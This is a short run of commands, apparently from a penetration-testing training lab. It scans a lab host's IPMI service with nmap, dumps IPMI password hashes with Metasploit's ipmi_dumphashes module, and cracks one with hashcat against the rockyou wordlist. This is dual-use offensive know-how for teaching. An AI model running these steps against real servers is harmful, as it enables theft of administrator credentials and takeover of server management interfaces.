
```shell-session
u@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```


```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
```


```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

```shell
hashcat -m 7300 -w 3 -O "93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8" /usr/share/wordlists/rockyou.txt
```


